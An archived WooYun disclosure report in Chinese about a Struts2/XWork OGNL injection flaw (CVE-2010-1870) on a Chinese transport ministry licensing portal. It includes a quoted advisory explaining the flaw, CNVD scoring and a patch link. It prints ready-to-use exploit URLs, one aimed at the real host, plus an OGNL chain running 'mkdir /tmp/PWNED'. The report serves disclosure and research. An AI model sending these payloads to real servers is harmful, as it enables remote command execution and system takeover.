@@ -1,0 +1,355 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		国家交通运输部某业务分站远程命令执行漏洞  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		国家交通运输部某业务分站远程命令执行漏洞  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/Xeyes">Xeyes</a> 
+</li><li>提交时间：		2012-03-10 15:51</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2012-03-10：	细节已通知厂商并且等待厂商处理中<br/>
+									2012-03-14：	厂商已经确认，细节仅向厂商公开<br/>
+									2012-03-24：	细节向核心白帽子及相关领域专家公开<br/>
+									2012-04-03：	细节向普通白帽子公开<br/>
+									2012-04-13：	细节向实习白帽子公开<br/>
+									2012-04-24：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">中华人民共和国交通运输部-行政许可网上办理平台存在3Apache Struts2 XWork绕过安全限制执行任意命令漏洞，利用此漏洞可获取系统root权限。<br />
+<br />
+</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">http://xkpt.moc.gov.cn/default/index.action?(&#039;\u0023_memberAccess[\&#039;allowStaticMethodAccess\&#039;]&#039;)(meh)=true&amp;(aaa)((&#039;\u0023context[\&#039;xwork.MethodAccessor.denyMethodExecution\&#039;]\u003d\u0023foo&#039;)(\u0023foo\u003dnew java.lang.Boolean(&quot;false&quot;)))&amp;(asdf)((&#039;\u0023rt.exec(&quot;命令执行&quot;)&#039;)(\u0023rt\u003d@java.lang.Runtime@getRuntime()))=1<br />
+<br />
+<br />
+<br />
+漏洞说明引至绿盟：<br />
+<br />
+http://www.nsfocus.net/vulndb/15431<br />
+<br />
+<br />
+<br />
+Apache Struts2 XWork绕过安全限制执行任意命令漏洞<br />
+<br />
+<br />
+<br />
+发布日期：2010-07-09<br />
+<br />
+更新日期：2010-07-15<br />
+<br />
+<br />
+<br />
+受影响系统：<br />
+<br />
+<br />
+<br />
+    OpenSymphony XWork &lt; 2.2.0<br />
+<br />
+    Apache Group Struts &lt; 2.2.0<br />
+<br />
+<br />
+<br />
+描述：CVE ID: CVE-2010-1870<br />
+<br />
+<br />
+<br />
+XWork是一个命令模式框架，用于支持Struts 2及其他应用。<br />
+<br />
+<br />
+<br />
+XWork处理用户请求参数数据时存在漏洞，远程攻击者可以利用此漏洞在系统上执行任意命令。<br />
+<br />
+<br />
+<br />
+Struts2中WebWork框架使用XWork基于HTTP参数名执行操作和调用，将每个HTTP参数名处理为OGNL（对象图形导航语言）语句，而OGNL将：  <br />
+<br />
+<br />
+<br />
+user.address.city=Bishkek&amp;user[&#039;favoriteDrink&#039;]=kumys  <br />
+<br />
+<br />
+<br />
+转换为：  <br />
+<br />
+<br />
+<br />
+action.getUser().getAddress().setCity(&quot;Bishkek&quot;)  <br />
+<br />
+action.getUser().setFavoriteDrink(&quot;kumys&quot;)  <br />
+<br />
+<br />
+<br />
+这是通过ParametersInterceptor来执行的，使用用户提供的HTTP参数调用ValueStack.setValue()。  <br />
+<br />
+<br />
+<br />
+除了获取和设置属性外，OGNL还支持其他一些功能：  <br />
+<br />
+<br />
+<br />
+    * 方法调用：foo()  <br />
+<br />
+    * 静态方式调用： @java.lang.System@exit(1)  <br />
+<br />
+    * 构建函数调用：new MyClass()  <br />
+<br />
+    * 处理上下文变量：#foo = new MyClass()  <br />
+<br />
+<br />
+<br />
+由于HTTP参数名为OGNL语句，为了防范攻击者通过HTTP参数调用任意方式，XWork使用了以下两个变量保护方式的执行：  <br />
+<br />
+<br />
+<br />
+    * OgnlContext的属性xwork.MethodAccessor.denyMethodExecution（默认设置为true）  <br />
+<br />
+    * SecurityMemberAccess私有字段allowStaticMethodAccess（默认设置为false）<br />
+<br />
+  <br />
+<br />
+为了方便开发人员访问各种常用的对象，XWork提供了一些预定义的上下文变量：  <br />
+<br />
+<br />
+<br />
+    * #application  <br />
+<br />
+    * #session  <br />
+<br />
+    * #request  <br />
+<br />
+    * #parameters  <br />
+<br />
+    * #attr  <br />
+<br />
+    * #context<br />
+<br />
+    * #_memberAccess<br />
+<br />
+    * #root  <br />
+<br />
+    * #this  <br />
+<br />
+    * #_typeResolver  <br />
+<br />
+    * #_classResolver  <br />
+<br />
+    * #_traceEvaluations  <br />
+<br />
+    * #_lastEvaluation  <br />
+<br />
+    * #_keepLastEvaluation  <br />
+<br />
+<br />
+<br />
+这些变量代表各种服务器端对象。为了防范篡改服务器端对象，XWork的ParametersInterceptor不允许参数名中出现“#”字符，但如果使用了Java的unicode字符串表示\u0023，攻击者就可以绕过保护，修改保护Java方式执行的值：  <br />
+<br />
+<br />
+<br />
+#_memberAccess[&#039;allowStaticMethodAccess&#039;] = true  <br />
+<br />
+#foo = new java .lang.Boolean(&quot;false&quot;)  <br />
+<br />
+#context[&#039;xwork.MethodAccessor.denyMethodExecution&#039;] = #foo  <br />
+<br />
+#rt = @java.lang.Runtime@getRuntime()  <br />
+<br />
+#rt.exec(&#039;mkdir /tmp/PWNED&#039;)<br />
+<br />
+<br />
+<br />
+&lt;*来源：Meder Kydyraliev （bugtraq@web.areopag.net）<br />
+<br />
+  <br />
+<br />
+  链接：http://secunia.com/advisories/32495/<br />
+<br />
+        http://www.exploit-db.com/exploits/14360/<br />
+<br />
+*&gt;<br />
+<br />
+<br />
+<br />
+测试方法：<br />
+<br />
+<br />
+<br />
+警 告<br />
+<br />
+<br />
+<br />
+以下程序(方法)可能带有攻击性，仅供安全研究与教学之用。使用者风险自负！<br />
+<br />
+http://mydomain/MyStruts.action?(&#039;\u0023_memberAccess[\&#039;allowStaticMethodAccess\&#039;]&#039;)(meh)=true&amp;(aaa)((&#039;\u0023context[\&#039;xwork.MethodAccessor.denyMethodExecution\&#039;]\u003d\u0023foo&#039;)(\u0023foo\u003dnew%20java.lang.Boolean(&quot;false&quot;)))&amp;(asdf)((&#039;\u0023rt.exit(1)&#039;)(\u0023rt\u003d@java.lang.Runtime@getRuntime()))=1<br />
+<br />
+<br />
+<br />
+建议：厂商补丁：<br />
+<br />
+<br />
+<br />
+Apache Group<br />
+<br />
+------------<br />
+<br />
+目前厂商已经发布了升级补丁以修复这个安全问题，请到厂商的主页下载：<br />
+<br />
+<br />
+<br />
+http://svn.apache.org/viewvc?view=revision&amp;revision=956389 </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail"></p><p class="detail"><a href="../images/101522391ff7b86f393bfafae095f22b6a0ca7c2.gif" target="_blank"><img src="../images/101522391ff7b86f393bfafae095f22b6a0ca7c2.gif" alt="" width="600"/></a></p><p class="detail"> </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail"><br />
+<br />
+目前厂商已经发布了升级补丁以修复这个安全问题，请到厂商的主页下载：<br />
+<br />
+<br />
+<br />
+http://svn.apache.org/viewvc?view=revision&amp;revision=956389 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/Xeyes" title="Xeyes">Xeyes</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-05168" title="国家交通运输部某业务分站远程命令执行漏洞">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：高</p>
+						<p class="detail">漏洞Rank：12 </p>
+													<p class="detail">确认时间：2012-03-14 16:12</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">CNVD确认漏洞存在，不过由于内部网络问题暂未复现确认远程连接情况。<br />
+由于涉及重点保障目标（子站），反馈确认较为谨慎。感谢xeyes.<br />
+<br />
+CNVD对该漏洞评分如下：<br />
+基本得分CVSS：(AV:R/AC:L/Au:NR/C:C/A:C/I:C/B:N) score:10.00(高危）<br />
+技术难度系数：1.0（一般，依据通用漏洞找到的个案）<br />
+影响危害系数：1.2（一般，子站非主站）<br />
+CNVD综合评分：10.00*1.0*1.2=12</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="5168";
+var bugRating="-3";
+var myRating="";
+var ratingCount="2";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
